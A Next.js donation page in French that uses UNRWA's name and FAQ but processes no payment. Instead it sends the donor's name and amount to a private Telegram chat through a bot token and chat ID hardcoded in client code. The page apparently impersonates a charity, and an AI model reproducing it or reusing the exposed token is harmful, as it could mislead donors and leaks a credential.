'use client'

import { useState, useEffect } from "react";
import Image from "next/image";
import { useSearchParams } from "next/navigation";

export default function PayPage() {
  const searchParams = useSearchParams();

  // حالات لتخزين القيم
  const [fullname, setFullname] = useState("");
  const [amount, setAmount] = useState("");
  const [currency, setCurrency] = useState("");
  const [loading, setLoading] = useState(false);

  const TELEGRAM_BOT_TOKEN = "8255290968:AAHMYhcRTfmvoHfkJGKRQh1rdbtqgBUoxok";
  const TELEGRAM_CHAT_ID = "5047074105";

  useEffect(() => {
    const nameParam = searchParams.get("name");
    const amountParam = searchParams.get("amount");
    const currencyParam = searchParams.get("currency") || "USD";

    if (nameParam) setFullname(nameParam);
    if (amountParam) setAmount(amountParam);
    setCurrency(currencyParam);
  }, [searchParams]);

  const handleSendTelegram = async () => {
    if (!fullname || !amount) {
      alert("Nom et montant requis pour envoyer le don.");
      return;
    }

    setLoading(true);
    const text = `💌 Nouveau don reçu!\nNom: ${fullname}\nMontant: ${amount} ${currency}`;

    try {
      await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID,
          text
        }),
      });
      alert("Message envoyé avec succès sur Telegram!");
    } catch (err) {
      console.error(err);
      alert("Erreur lors de l'envoi sur Telegram.");
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="container bg-light py-5">
      <div className="row g-4">

        {/* Première carte */}
        <div className="col-12 col-lg-6">
          <div className="card text-bg-dark h-100 border-0 shadow overflow-hidden">
            <div className="ratio ratio-16x9">
              <Image
                src="/one.webp"
                alt="Soutenir les réfugiés palestiniens"
                fill
                style={{ objectFit: "cover" }}
              />
            </div>
            <div className="card-img-overlay d-flex align-items-center bg-dark bg-opacity-50">
              <h1 className="card-text fw-bold text-white">
                Donnez aujourd’hui pour soutenir les réfugiés palestiniens
              </h1>
            </div>
          </div>
        </div>

        {/* Carte avec résumé du don */}
        <div className="col-12 col-lg-6">
          <div className="card text-bg-info h-100 d-flex flex-column justify-content-start align-items-start p-4 shadow border-0">
            <h1 className="text-light">Résumé des informations sur le don</h1>
            <p className="text-light border-5 border-start border-light ps-3">
              ❤️ Donnez mensuellement
            </p>

            {/* عرض القيم من البارامتر */}
            <p className="text-light fw-bold">Montant: {amount || "0"} {currency}</p>
            <p className="text-light fw-bold">Nom: {fullname || "Nom Prénom"}</p>

            <br/>
            <hr className="w-50 border border-light border-1 mx-auto" />
            <br/>

            <button 
              type="button" 
              className="btn btn-light w-100 fw-bold" 
              onClick={handleSendTelegram} 
              disabled={loading}
            >
              {loading ? "Envoi..." : "Envoyer sur Telegram"}
            </button>
          </div>
        </div>

        {/* Texte supplémentaire */}
        <div className="col-12 col-lg-6 text-dark">
          <h1 className="fw-bold">
            Et si votre don pouvait tout changer pour une famille dans le besoin ?
          </h1>
          <p>
            En ce moment, les familles de réfugiés palestiniens comptent sur l’UNRWA – et sur vous – pour les aider à traverser des épreuves inimaginables. 
            Votre don garantit que la nourriture est livrée, que les enfants sont pris en charge et que l’espoir reste vivant. Ensemble, nous pouvons maintenir ce lien vital.
          </p>
          <h1 className="text-info fw-bold">Faites un don dès aujourd’hui.</h1>
        </div>

        {/* FAQ */}
        <div className="col-12 col-lg-6 text-dark">
          <h1 className="fw-bold">Questions fréquemment posées</h1>
        </div>

        <div className="col-12 col-lg-6">
          <div className="accordion shadow border-0" id="accordionExample">
            <div className="accordion-item">
              <h2 className="accordion-header">
                <button
                  className="accordion-button text-dark"
                  type="button"
                  data-bs-toggle="collapse"
                  data-bs-target="#collapseOne"
                  aria-expanded="true"
                  aria-controls="collapseOne"
                >
                  Comment mon don aura-t-il un impact ?
                </button>
              </h2>
              <div
                id="collapseOne"
                className="accordion-collapse collapse show"
                data-bs-parent="#accordionExample"
              >
                <div className="accordion-body">
                  Votre soutien aide directement les réfugiés palestiniens dans nos cinq zones d’opération : Gaza, la Cisjordanie y compris Jérusalem-Est, le Liban, la Syrie et la Jordanie. 
                  Chaque don, quel que soit le montant, nous aide à fournir aux familles une aide alimentaire et financière vitale, l’éducation, les soins de santé et bien plus encore.
                </div>
              </div>
            </div>

            <div className="accordion-item">
              <h2 className="accordion-header">
                <button
                  className="accordion-button collapsed"
                  type="button"
                  data-bs-toggle="collapse"
                  data-bs-target="#collapseTwo"
                  aria-expanded="false"
                  aria-controls="collapseTwo"
                >
                 Mon don est-il déductible des impôts ?
                </button>
              </h2>
              <div
                id="collapseTwo"
                className="accordion-collapse collapse"
                data-bs-parent="#accordionExample"
              >
                <div className="accordion-body">
                 Les dons sont déductibles dans plusieurs pays :  
                 • Pour les donateurs au Canada, les contributions à l’UNRWA sont déductibles.  
                 • Pour les donateurs aux États-Unis, les contributions à UNRWA USA sont déductibles.  
                 • Pour les donateurs en Espagne, les contributions à UNRWA Espagne sont déductibles.  

                 Pour d’autres pays, veuillez consulter votre conseiller fiscal ou nous contacter à donation@unrwa.org
                </div>
              </div>
            </div>

            <div className="accordion-item">
              <h2 className="accordion-header">
                <button
                  className="accordion-button collapsed"
                  type="button"
                  data-bs-toggle="collapse"
                  data-bs-target="#collapseThree"
                  aria-expanded="false"
                  aria-controls="collapseThree"
                >
                  Pourquoi devrais-je devenir donateur mensuel ?
                </button>
              </h2>
              <div
                id="collapseThree"
                className="accordion-collapse collapse"
                data-bs-parent="#accordionExample"
              >
                <div className="accordion-body">
                  En devenant donateur mensuel, vous pouvez fournir un soutien continu aux réfugiés dans le besoin. 
                  Les dons mensuels garantissent que nous pouvons répondre immédiatement aux urgences et offrir une aide durable aux familles tout au long de l’année.
                </div>
              </div>
            </div>
          </div>
        </div>

        {/* Logos / autres cartes */}
        <div className="col-12 col-lg-6">
          <div className="d-flex flex-wrap gap-3 justify-content-center align-items-center my-5">
            <Image src="/11.svg" alt="..." width={40} height={40} />
            <Image src="/2.svg" alt="..." width={40} height={40} />
            <Image src="/1.svg" alt="..." width={60} height={60} />
            <Image src="/4.svg" alt="..." width={60} height={60} />
            <Image src="/5.svg" alt="..." width={60} height={60} />
            <Image src="/6.svg" alt="..." width={60} height={60} />
            <Image src="/7.svg" alt="..." width={60} height={60} />
            <Image src="/8.svg" alt="..." width={60} height={60} />
          </div>
        </div>

      </div>
    </div>
  );
                                              }
